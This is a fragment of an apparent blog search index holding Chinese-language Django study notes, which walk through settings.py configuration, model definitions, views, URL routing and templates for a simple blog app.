&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p>5.其他常见的操作可以搜索相关的资料</p>\n<h3 id=\"结束语\"><a href=\"#结束语\" class=\"headerlink\" title=\"结束语\"></a>结束语</h3><p>本篇中我们主要学习models中对象中的相关操作，常用的数据操作，熟练掌握，后面会对我们实际项目开发中事半功倍，然后介绍Django的ORM怎么操作一对一、一对多、多对多的操作。</p>\n","categories":["Django"],"tags":["Django"]},{"title":"Django学习笔记(二)","url":"https://www.xjseck.com/2018/01/28/Django学习笔记-二/","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>学习最快的办法就是动手实践。</p>\n<ul>\n<li>通过上一个笔记的学习，我们应该能学习到了内容如下<ul>\n<li>能使用 Django创建 项目和一些参数的说明</li>\n<li>能清楚Django默认创建项目的文件目录结构</li>\n</ul>\n</li>\n<li>通过本笔记的学习我们可以学习到的知识点如下<ul>\n<li>默认创建的Django配置解读</li>\n<li>创建app</li>\n<li>实例一个MVT</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"实例\"><a href=\"#实例\" class=\"headerlink\" title=\"实例\"></a>实例</h3><p>从上一个笔记到这个笔记的过度，需要动手操作才能很好的掌握。Django版本1.8.5<br>实例（二）</p>\n<p>默认的配置文件了解<br>Django相关的配置都在settings.py文件中<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># Build paths inside the project like this: os.path.join(BASE_DIR, ...)</span><br><span class=\"line\">import os</span><br><span class=\"line\">BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))</span><br><span class=\"line\"># Quick-start development settings - unsuitable for production</span><br><span class=\"line\"># See https://docs.djangoproject.com/en/1.8/howto/deployment/checklist/</span><br><span class=\"line\"># SECURITY WARNING: keep the secret key used in production secret!</span><br><span class=\"line\">SECRET_KEY = &apos;abmu19wmz5#1qwmfc_wagpf_vh+8faqs8=#xi=mik1+4*9b*dv&apos;</span><br><span class=\"line\"># SECURITY WARNING: don&apos;t run with debug turned on in production!</span><br><span class=\"line\">DEBUG = False   #进行调试模式 True为开启</span><br><span class=\"line\"># If this flag set to False, then user can&apos;t register account.</span><br><span class=\"line\">IS_REGISTER_PERIOD = True</span><br><span class=\"line\">ALLOWED_HOSTS = [&apos;127.0.0.1&apos;]</span><br><span class=\"line\"># Application definition  创建的app应用定义到这里</span><br><span class=\"line\">INSTALLED_APPS = (</span><br><span class=\"line\">    &apos;django.contrib.admin&apos;, #管理员站点</span><br><span class=\"line\">    &apos;django.contrib.auth&apos;,#用户验证框架</span><br><span class=\"line\">    &apos;django.contrib.contenttypes&apos;,#文件类型框架</span><br><span class=\"line\">    &apos;django.contrib.sessions&apos;,#会话框架</span><br><span class=\"line\">    &apos;django.contrib.messages&apos;,#消息框架</span><br><span class=\"line\">    &apos;django.contrib.staticfiles&apos;,#静态资源管理框架</span><br><span class=\"line\">    &apos;account&apos;,  #激活应用</span><br><span class=\"line\">    &apos;home&apos;,</span><br><span class=\"line\">    &apos;dashboard&apos;,</span><br><span class=\"line\">    &apos;gameboard&apos;,</span><br><span class=\"line\">    &apos;noticeboard&apos;,</span><br><span class=\"line\">)</span><br><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\">中间件，介于request 和 response处理之间的一道处理过程，相对比较轻量级，并且在全局上改变，django的输入与输出，因为改变的是全局</span><br><span class=\"line\">所以需要谨慎使用，用不好会影响性能，每一个中间件都会负责一个功能，例如AuthentictionMiddleware和session处理相关，</span><br><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\">MIDDLEWARE_CLASSES = (</span><br><span class=\"line\">    &apos;django.contrib.sessions.middleware.SessionMiddleware&apos;,</span><br><span class=\"line\">    &apos;django.middleware.common.CommonMiddleware&apos;,</span><br><span class=\"line\">    &apos;django.middleware.csrf.CsrfViewMiddleware&apos;,</span><br><span class=\"line\">    &apos;django.contrib.auth.middleware.AuthenticationMiddleware&apos;,</span><br><span class=\"line\">    &apos;django.contrib.auth.middleware.SessionAuthenticationMiddleware&apos;,</span><br><span class=\"line\">    &apos;django.contrib.messages.middleware.MessageMiddleware&apos;,</span><br><span class=\"line\">    &apos;django.middleware.clickjacking.XFrameOptionsMiddleware&apos;,</span><br><span class=\"line\">    &apos;django.middleware.security.SecurityMiddleware&apos;,</span><br><span class=\"line\">)</span><br><span class=\"line\">ROOT_URLCONF = &apos;hexactf.urls&apos;#这个变量的值就是根URLconf的模块名，默认是urls.py 文件的模块名</span><br><span class=\"line\">TEMPLATES = [</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        &apos;BACKEND&apos;: &apos;django.template.backends.django.DjangoTemplates&apos;,</span><br><span class=\"line\">        &apos;DIRS&apos;: [os.path.join(BASE_DIR, &quot;static&quot;, &quot;templates&quot;)],  #指定模板文件目录</span><br><span class=\"line\">        &apos;APP_DIRS&apos;: True,</span><br><span class=\"line\">        &apos;OPTIONS&apos;: &#123;</span><br><span class=\"line\">            &apos;context_processors&apos;: [</span><br><span class=\"line\">                &apos;django.template.context_processors.debug&apos;,</span><br><span class=\"line\">                &apos;django.template.context_processors.request&apos;,</span><br><span class=\"line\">                &apos;django.contrib.auth.context_processors.auth&apos;,</span><br><span class=\"line\">                &apos;django.contrib.messages.context_processors.messages&apos;,</span><br><span class=\"line\">            ],</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">]</span><br><span class=\"line\">WSGI_APPLICATION = &apos;hexactf.wsgi.application&apos;</span><br><span class=\"line\"># Database</span><br><span class=\"line\"># https://docs.djangoproject.com/en/1.8/ref/settings/#databases</span><br><span class=\"line\">&apos;&apos;&apos;</span><br><span class=\"line\">DATABASES = &#123;</span><br><span class=\"line\">    &apos;default&apos;: &#123;</span><br><span class=\"line\">        &apos;ENGINE&apos;: &apos;django.db.backends.sqlite3&apos;,</span><br><span class=\"line\">        &apos;NAME&apos;: os.path.join(BASE_DIR, &apos;db.sqlite3&apos;),</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&apos;&apos;&apos;</span><br><span class=\"line\">DATABASES = &#123;</span><br><span class=\"line\">    &apos;default&apos;: &#123;</span><br><span class=\"line\">        &apos;ENGINE&apos;: &apos;django.db.backends.mysql&apos;,  #数据库引擎</span><br><span class=\"line\">        &apos;NAME&apos;: &apos;database_name&apos;,</span><br><span class=\"line\">        &apos;USER&apos;: &apos;mysql_id&apos;,</span><br><span class=\"line\">        &apos;PASSWORD&apos;: &apos;mysql_passwd&apos;,</span><br><span class=\"line\">        &apos;HOST&apos;: &apos;localhost&apos;,</span><br><span class=\"line\">        &apos;PORT&apos;: &apos;&apos;,</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"># Internationalization</span><br><span class=\"line\"># https://docs.djangoproject.com/en/1.8/topics/i18n/</span><br><span class=\"line\">LANGUAGE_CODE = &apos;ko-kr&apos;  #语言</span><br><span class=\"line\">TIME_ZONE = &apos;Asia/Seoul&apos;  #时区</span><br><span class=\"line\">USE_I18N = True  #语言</span><br><span class=\"line\">USE_L10N = True  #数据和时间格式</span><br><span class=\"line\">USE_TZ = False   #是否启用时区</span><br><span class=\"line\"># Static files (CSS, JavaScript, Images)</span><br><span class=\"line\"># https://docs.djangoproject.com/en/1.8/howto/static-files/</span><br><span class=\"line\">STATIC_URL = &apos;/static/&apos;</span><br><span class=\"line\">LOGIN_URL = &apos;/account/sign_in/&apos;</span><br><span class=\"line\">LOGOUT_URL = &apos;/account/sign_out/&apos;</span><br><span class=\"line\">MEDIA_ROOT = os.path.join(BASE_DIR, &apos;static&apos;)</span><br><span class=\"line\">MEDIA_URL = &apos;/media/&apos;</span><br><span class=\"line\">if DEBUG:</span><br><span class=\"line\">        STATIC_ROOT = os.path.join(BASE_DIR, &apos;/static&apos;, &apos;static&apos;)</span><br><span class=\"line\">else:</span><br><span class=\"line\">        STATIC_ROOT = os.path.join(BASE_DIR, &apos;static&apos;, &apos;static&apos;)</span><br><span class=\"line\">STATICFILES_DIRS = os.path.join(BASE_DIR, &quot;static&quot;, &quot;static&quot;),</span><br></pre></td></tr></table></figure></p>\n<p>创建app<br>    $python manage startapp blog<br>编写一个MVT<br>    例子的层级目录如下<br><img src=\"1.jpg\" alt=\"\"><br>首先我们创建好了blog app 添加到settings.py 中<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">INSTALLED_APPS = (</span><br><span class=\"line\">    &apos;django.contrib.admin&apos;,</span><br><span class=\"line\">    &apos;django.contrib.auth&apos;,</span><br><span class=\"line\">    &apos;django.contrib.contenttypes&apos;,</span><br><span class=\"line\">    &apos;django.contrib.sessions&apos;,</span><br><span class=\"line\">    &apos;django.contrib.messages&apos;,</span><br><span class=\"line\">    &apos;django.contrib.staticfiles&apos;,</span><br><span class=\"line\">    &apos;blog&apos;,</span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure></p>\n<p>本例子中涉及到model中的相关内容在model.py中，model.py中的代码如下<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#coding:utf-8</span><br><span class=\"line\">from django.db import models</span><br><span class=\"line\">from django.contrib.auth.models import User</span><br><span class=\"line\"># Create your models here.</span><br><span class=\"line\">#  创建数据库表</span><br><span class=\"line\">#step1：类名就是数据库中的表名，要继承models</span><br><span class=\"line\">class Category(models.Model):</span><br><span class=\"line\">    &quot;&quot;&quot;</span><br><span class=\"line\">    Django 要求模型必须继承 models.Model 类。</span><br><span class=\"line\">    Category 只需要一个简单的分类名 name 就可以了。</span><br><span class=\"line\">    CharField 指定了分类名 name 的数据类型，CharField 是字符型，</span><br><span class=\"line\">    CharField 的 max_length 参数指定其最大长度，超过这个长度的分类名就不能被存入数据库。</span><br><span class=\"line\">    当然 Django 还为我们提供了多种其它的数据类型，如日期时间类型 DateTimeField、整数类型 IntegerField 等等。</span><br><span class=\"line\">    Django 内置的全部类型可查看文档：</span><br><span class=\"line\">    https://docs.djangoproject.com/en/1.10/ref/models/fields/#field-types</span><br><span class=\"line\">    &quot;&quot;&quot;</span><br><span class=\"line\">    name = models.CharField(max_length=100)</span><br><span class=\"line\">    #python3  使用str  把对象以字符串形式显示  shell模式下all()函数可以显示数据</span><br><span class=\"line\">    #python2.7  使用unicode</span><br><span class=\"line\">    def __unicode__(self):</span><br><span class=\"line\">        return self.name</span><br><span class=\"line\">    # def __str__(self):</span><br><span class=\"line\">    #     return self.name</span><br><span class=\"line\">class Tag(models.Model):</span><br><span class=\"line\">    &quot;&quot;&quot;</span><br><span class=\"line\">    标签 Tag 也比较简单，和 Category 一样。</span><br><span class=\"line\">    再次强调一定要继承 models.Model 类！</span><br><span class=\"line\">    &quot;&quot;&quot;</span><br><span class=\"line\">    name = models.CharField(max_length=100)</span><br><span class=\"line\">    def __unicode__(self):</span><br><span class=\"line\">        return self.name</span><br><span class=\"line\">    # def __str__(self):</span><br><span class=\"line\">    #     return self.name</span><br><span class=\"line\">class New(models.Model):</span><br><span class=\"line\">    # 文章标题</span><br><span class=\"line\">    title = models.CharField(max_length=70)</span><br><span class=\"line\">    # 文章正文，我们使用了 TextField。</span><br><span class=\"line\">    # 存储比较短的字符串可以使用 CharField，但对于文章的正文来说可能会是一大段文本，因此使用 TextField 来存储大段文本。</span><br><span class=\"line\">    body = models.TextField()</span><br><span class=\"line\">    # 这两个列分别表示文章的创建时间和最后一次修改时间，存储时间的字段用 DateTimeField 类型。</span><br><span class=\"line\">    created_time = models.DateTimeField()</span><br><span class=\"line\">    modified_time = models.DateTimeField()</span><br><span class=\"line\">    # 文章摘要，可以没有文章摘要，但默认情况下 CharField 要求我们必须存入数据，否则就会报错。</span><br><span class=\"line\">    # 指定 CharField 的 blank=True 参数值后就可以允许空值了。</span><br><span class=\"line\">    excerpt = models.CharField(max_length=200, blank=True)</span><br><span class=\"line\">    # 这是分类与标签，分类与标签的模型我们已经定义在上面。</span><br><span class=\"line\">    # 我们在这里把文章对应的数据库表和分类、标签对应的数据库表关联了起来，但是关联形式稍微有点不同。</span><br><span class=\"line\">    # 我们规定一篇文章只能对应一个分类，但是一个分类下可以有多篇文章，所以我们使用的是 ForeignKey，即一对多的关联关系。</span><br><span class=\"line\">    # 而对于标签来说，一篇文章可以有多个标签，同一个标签下也可能有多篇文章，所以我们使用 ManyToManyField，表明这是多对多的关联关系。</span><br><span class=\"line\">    # 同时我们规定文章可以没有标签，因此为标签 tags 指定了 blank=True。</span><br><span class=\"line\">    # 如果你对 ForeignKey、ManyToManyField 不了解，请看教程中的解释，亦可参考官方文档：</span><br><span class=\"line\">    # https://docs.djangoproject.com/en/1.10/topics/db/models/#relationships</span><br><span class=\"line\">    category = models.ForeignKey(Category)</span><br><span class=\"line\">    tags = models.ManyToManyField(Tag, blank=True)</span><br><span class=\"line\">    # 文章作者，这里 User 是从 django.contrib.auth.models 导入的。</span><br><span class=\"line\">    # django.contrib.auth 是 Django 内置的应用，专门用于处理网站用户的注册、登录等流程，User 是 Django 为我们已经写好的用户模型。+</span><br><span class=\"line\">    # 这里我们通过 ForeignKey 把文章和 User 关联了起来。</span><br><span class=\"line\">    # 因为我们规定一篇文章只能有一个作者，而一个作者可能会写多篇文章，因此这是一对多的关联关系，和 Category 类似。</span><br><span class=\"line\">    author = models.ForeignKey(User)</span><br><span class=\"line\">    def __unicode__(self):</span><br><span class=\"line\">        return self.title</span><br></pre></td></tr></table></figure></p>\n<p>在settings.py中查看数据库的配置信息，创建数据库<br>准备工作完成之后我们需要执行<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$python manage.py makemigrations</span><br><span class=\"line\">$python manage.py migrate</span><br></pre></td></tr></table></figure></p>\n<p>所以我们直接在blog目录下的views.py中编写代码<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#coding:utf-8</span><br><span class=\"line\">from django.shortcuts import render</span><br><span class=\"line\">from models import New</span><br><span class=\"line\">from  django.http import HttpResponse</span><br><span class=\"line\">from forms import AddForm</span><br><span class=\"line\"># Create your views here.</span><br><span class=\"line\">#直接使用Views 把数据推送到Template中进行浏览器显示</span><br><span class=\"line\">def index(request):</span><br><span class=\"line\">    return HttpResponse(&apos;欢迎来到博客首页！&lt;a href=&quot;/show&quot;&gt;show&lt;/a&gt; &lt;a href=&quot;/add&quot;&gt;add&lt;/a&gt;&apos;)</span><br><span class=\"line\">def show(request):</span><br><span class=\"line\">    new_list=New.objects.all()</span><br><span class=\"line\">    return render(request,&apos;blog/show.html&apos;,&#123;&apos;new_list&apos;:new_list&#125;)</span><br><span class=\"line\">def add(request):</span><br><span class=\"line\">    if request.method == &apos;POST&apos;:</span><br><span class=\"line\">        form = AddForm(request.POST)</span><br><span class=\"line\">        if form.is_valid():</span><br><span class=\"line\">            a=form.cleaned_data[&apos;a&apos;]</span><br><span class=\"line\">            b=form.cleaned_data[&apos;b&apos;]</span><br><span class=\"line\">            return HttpResponse(str(int(a)+int(b)))</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        form=AddForm()</span><br><span class=\"line\">    return render(request,&apos;blog/add.html&apos;,&#123;&apos;form&apos;:form&#125;)</span><br></pre></td></tr></table></figure></p>\n<p>代码的说明之后的内容会详细讲到，目前是先这样了解用着。<br>有了Views中的内容之后，我们怎样把它推送给客户浏览器上进行显示。<br>之后我们需要在blog目录下的urls.py中进行设置<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from django.conf.urls import url</span><br><span class=\"line\">from . import views</span><br><span class=\"line\">urlpatterns=[</span><br><span class=\"line\">    url(r&apos;^$&apos;,views.index,name=&apos;index&apos;),</span><br><span class=\"line\">    url(r&apos;^show/$&apos;,views.show),</span><br><span class=\"line\">    url(r&apos;^add/$&apos;,views.add),</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure></p>\n<p>我们来创建templates这里我们有两种的创建方式，一种是统一在项目的根目录下创建一个templates文件然后里面创建app的名字文件夹本例子中使用的就是这一种，还有一种就是在app blog目录下创建templates文件夹，只是在变代码的时候模板文件路径略有不同而已。<br>模板文件的代码show.html</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html lang=&quot;en&quot;&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class=\"line\">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;table border=&quot;1xp&quot;&gt;</span><br><span class=\"line\">    &lt;thead&gt;</span><br><span class=\"line\">    &lt;tr&gt;</span><br><span class=\"line\">        &lt;th&gt;标题&lt;/th&gt;</span><br><span class=\"line\">        &lt;th&gt;内容&lt;/th&gt;</span><br><span class=\"line\">    &lt;/tr&gt;</span><br><span class=\"line\">    &lt;/thead&gt;</span><br><span class=\"line\">    &lt;tbody&gt;</span><br><span class=\"line\">        &#123;% for line in new_list %&#125;</span><br><span class=\"line\">        &lt;tr&gt;</span><br><span class=\"line\">            &lt;td&gt;&#123;&#123; line.title &#125;&#125;&lt;/td&gt;</span><br><span class=\"line\">            &lt;td&gt;&#123;&#123; line.body &#125;&#125;&lt;/td&gt;</span><br><span class=\"line\">        &lt;/tr&gt;</span><br><span class=\"line\">        &#123;% endfor %&#125;</span><br><span class=\"line\">    &lt;/tbody&gt;</span><br><span class=\"line\">&lt;/table&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<p>add.html如下<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html lang=&quot;en&quot;&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class=\"line\">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;form method=&quot;post&quot;&gt;</span><br><span class=\"line\">    &#123;% csrf_token %&#125;</span><br><span class=\"line\">    &#123;&#123; form&#125;&#125;</span><br><span class=\"line\">    &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class=\"line\">&lt;/form&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>\n<p>需要使Django找打模板文件的路径<br>还需要在settings.py中设置DIRS<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">TEMPLATES = [</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        &apos;BACKEND&apos;: &apos;django.template.backends.django.DjangoTemplates&apos;,</span><br><span class=\"line\">        &apos;DIRS&apos;: [os.path.join(BASE_DIR, &apos;templates&apos;)],</span><br><span class=\"line\">        &apos;APP_DIRS&apos;: True,</span><br><span class=\"line\">        &apos;OPTIONS&apos;: &#123;</span><br><span class=\"line\">            &apos;context_processors&apos;: [</span><br><span class=\"line\">                &apos;django.template.context_processors.debug&apos;,</span><br><span class=\"line\">                &apos;django.template.context_processors.request&apos;,</span><br><span class=\"line\">                &apos;django.contrib.auth.context_processors.auth&apos;,</span><br><span class=\"line\">                &apos;django.contrib.messages.context_processors.messages&apos;,</span><br><span class=\"line\">            ],</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure></p>\n<p>最后实现了一个简单的mvt模式，但是之中的内容还需要私下底查一些相关的资料，进行详细的学习。</p>\n<h3 id=\"结束语\"><a href=\"#结束语\" class=\"headerlink\" title=\"结束语\"></a>结束语</h3><p>本篇的学习，我们了解了Django的MVT模式，本篇的内容还得学习一些Django 中相关操作。代码上传到了github了<a href=\"https://github.com/Huseck/Django-study/tree/Django-study-2\" target=\"_blank\" rel=\"noopener\">https://github.com/Huseck/Django-study/tree/Django-study-2</a> 下载配置的问题需要把blog目录下migrations目录下的 inital.py之类的文件删除然后数据迁移<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$python manage.py makemigrations </span><br><span class=\"line\">$python manage.py migrate</span><br><span class=\"line\">$python manage.py runserver</span><br></pre></td></tr></table></figure></p>\n<p>如以下的相关知识点</p>\n<ol>\n<li>Django 处理Form表单的操作</li>\n<li>url正则的知识点</li>\n<li>模板代码 操作</li>\n<li>Django 怎么处理url参数的传递的</li>\n</ol>\n","categories":["Django"],"tags":["Django"]},{"title":"Django 学习笔记(一)","url":"https://www.xjseck.com/2018/01/26/Django-学习笔记-一/","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>1.2018年了，计划一下学习任务。</p>\n<p>深入学习Python<br>学习Django 或者Flask 框架进行Web项目的开发<br>深入学习PHP相关的黑科技和代码审计<br>渗透测试流程和技巧总结<br>社团相关的运营</p>\n<p>先学习Django<br>学习Django MVT 开发模式，主要学习Django的配置说明和app应用之间的耦合进行项目的组合。<br>进行快速的web项目开发。</p>\n<p><strong>基础知识点</strong><br>学习 前端相关知识点（html css js form表单）<br>学习 Python的一些基础语法点<br>学习 Linux 基础操作和命令<br>学习 数据库的相关操作<br>学习 HTTP协议的一些参数<br>学习 COOKIES SESSION 判断状态和权限<br>参考<br><code>http://python.usyiyi.cn/translate/django_182/index.html</code></p>\n<p><code>https://code.ziqiangxuetang.com/django/django-registration.html</code></p>\n<p>Django版本的一些特点<br>版本之间的改动，基本操作和相关的一些配置说明。</p>\n<h3 id=\"例子\"><a href=\"#例子\" class=\"headerlink\" title=\"例子\"></a>例子</h3><p>快速的掌握Django就是拿例子说明，先明白在Django框架下的相关操作的规则之后，在回过头来明白实现的机理。<br>例子（一）<br>环境window10 Python2.7</p>\n<p>1.先配置本机的Python隔离环境<br>    $pip install virtualenv<br>2.建立Django项目<br>    $pip install django<br>    本地环境变量设置一下<br>    